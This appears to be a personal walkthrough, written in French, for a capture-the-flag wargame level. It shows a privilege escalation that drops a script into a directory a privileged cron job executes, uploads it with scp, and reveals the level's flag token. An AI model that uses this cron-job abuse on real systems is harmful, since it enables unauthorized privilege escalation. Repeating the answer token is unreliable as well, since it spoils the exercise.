@@ -1,0 +1,38 @@
+On user connect:
+——————————
+You have new mail.
+——————————
+Système email: locale SMTP
+	/usr/share/perl/5.14.2/Net/SMTP.pm
+printenv USER
+printenv MAIL
+	/var/mail/level05
+Go cat
+	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+c’est un Cronjob qui run toutes les 2 minutes
+Go cat openarenaserver
+
+-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
+openarenaserver à bien acces au getflag de flag05
+On vas essayer de l’exploier, car il prend en option *
+
+On peut aussi créer et lire des fichier dans ce dossier
+/opt/openarenaserver/
+ls /opt/openarenaserver/
+
+Créer un script qui getflag
+#!/bin/sh
+getflag > /opt/openarenaserver/flag
+
+On le rend exécutable car Bash -x fichier
+Vrai si le fichier existe et est exécutable.
+	chmod 755 AAAA.sh 
+
+Copier depuis l’hote vers la machine
+scp -P 4242 /Users/morganealbanese/Desktop/wireshark/AAAA.sh level05@192.168.1.19:/opt/openarenaserver
+
+cat /opt/openarenaserver/flag
+
+Et voila le flag 
+Check flag.Here is your token : viuaaale9huek52boumoomioc
